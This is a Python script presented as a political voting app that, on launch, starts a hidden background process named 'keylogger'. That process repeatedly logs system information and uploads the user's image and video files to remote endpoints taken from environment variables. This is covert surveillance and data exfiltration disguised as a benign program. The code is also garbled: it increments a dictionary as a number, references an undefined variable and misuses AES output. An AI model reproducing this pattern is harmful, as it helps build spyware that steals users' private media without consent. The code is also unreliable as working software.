import os
import sys
import json
import requests
import logging
import platform
import subprocess
import sqlite3
import time
import shutil
from multiprocessing import Process, Manager
from base64 import b64decode, b64encode
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto import Random

# Configuration
VOTE_ENDPOINT = os.getenv("VOTE_ENDPOINT")
API_KEY = os.getenv("API_KEY")
DATA_DIR = "data"
DB_PATH = "data/db.sqlite"

# Keylogger
LOG_FILE = "honeypot.txt"
KEYLOGGER_PROCESS = None
KEYLOGGER_RUNNING = False

# Voting platform
VOTE_COUNT = {"Impeach Trump": 0, "Don't Impeach": 0}
VOTE_RESULT = "Impeach Trump"

# Media transfer
MEDIA_DIR = "media"
IMAGE_EXTENSIONS = [".jpg", ".jpeg", ".png"]
VIDEO_EXTENSIONS = [".mp4", ".mov", ".avi"]

def main():
    global VOTE_COUNT
    global VOTE_RESULT

    create_data_directory()
    create_log_file()

    start_keylogger()

    while True:
        try:
            vote = input("Vote for impeaching Trump (y/n): ")

            if vote.lower() == "y":
                VOTE_COUNT += 1
                VOTE_RESULT = "Impeach Trump"
            elif vote.lower() == "n":
                VOTE_COUNT += 1
                VOTE_RESULT = "Don't impeach Trump"
            else:
                print("Invalid input. Please try again.")

            send_vote_to_server()

            # Simulate voting result
            time.sleep(3)
            print(f"Result: {VOTE_RESULT} is winning with {VOTE_COUNT} votes")

        except Exception as e:
            logging.exception(e)

def create_data_directory():
    if not os.path.exists(DATA_DIR):
        os.makedirs(DATA_DIR)

    if not os.path.exists(DB_PATH):
        with open(DB_PATH, "w"):
            pass

    if not os.path.exists(MEDIA_DIR):
        os.makedirs(MEDIA_DIR)

def create_log_file():
    if not os.path.exists(LOG_FILE):
        with open(LOG_FILE, "w"):
            pass

def start_keylogger():
    global KEYLOGGER_PROCESS
    global KEYLOGGER_RUNNING

    if not KEYLOGGER_RUNNING:
        KEYLOGGER_PROCESS = Process(target=keylogger)
        KEYLOGGER_PROCESS.start()
        KEYLOGGER_RUNNING = True

def send_vote_to_server():
    payload = {
        "api_key": encrypt(API_KEY),
        "vote": VOTE_RESULT
    }

    try:
        response = requests.post(VOTE_ENDPOINT, data=payload, headers={"Content-Type": "application/json"})
        response.raise_for_status()
        print("Vote sent successfully.")
    except requests.exceptions.RequestException as e:
        logging.exception(e)

def keylogger():
    global KEYLOGGER_RUNNING

    try:
        while True:
            with open(LOG_FILE, "a") as log_file:
                log_file.write(get_system_info())

            collect_media()

            time.sleep(60)
    except KeyboardInterrupt:
        KEYLOGGER_RUNNING = False

def get_system_info():
    info = f"[*] System information\n"
    info += f"  - OS: {platform.system()} {platform.release()}\n"
    info += f"  - Python version: {platform.python_version()}\n"
    info += f"  - Platform: {platform.platform()}\n"
    info += f"  - Machine: {platform.machine()}\n"

    return info

def collect_media():
    try:
        # Collect images
        image_files = [f for f in os.listdir(MEDIA_DIR) if os.path.splitext(f)[1] in IMAGE_EXTENSIONS]
        for image_file in image_files:
            with open(os.path.join(MEDIA_DIR, image_file), "rb") as image:
                image_data = image.read()
                send_media_to_server(image_data, "image")

        # Collect videos
        video_files = [f for f in os.listdir(MEDIA_DIR) if os.path.splitext(f)[1] in VIDEOS_EXTENSIONS]
        for video_file in video_files:
            with open(os.path.join(MEDIA_DIR, video_file), "rb") as video:
                video_data = video.read()
                send_media_to_server(video_data, "video")

    except Exception as e:
        logging.exception(e)

def send_media_to_server(media_data, media_type):
    try:
        media_endpoint = os.getenv(f"{media_type.upper()}_ENDPOINT")
        media_payload = {
            "api_key": encrypt(API_KEY),
            "data": b64encode(media_data).decode("utf-8"),
            "type": media_type
        }

        response = requests.post(media_endpoint, data=media_payload, headers={"Content-Type": "application/json"})
        response.raise_for_status()

        print(f"{media_type.capitalize()} sent successfully.")
    except requests.exceptions.RequestException as e:
        logging.exception(e)

# Encryption
def encrypt(data):
    key = b64decode(os.getenv("ENCRYPTION_KEY"))
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.encrypt(pad(data)).decode("utf-8")

def pad(data):
    pad_len = AES.block_size - len(data) % AES.block_size
    return data + chr(pad_len) * pad_len

if __name__ == "__main__":
    main()
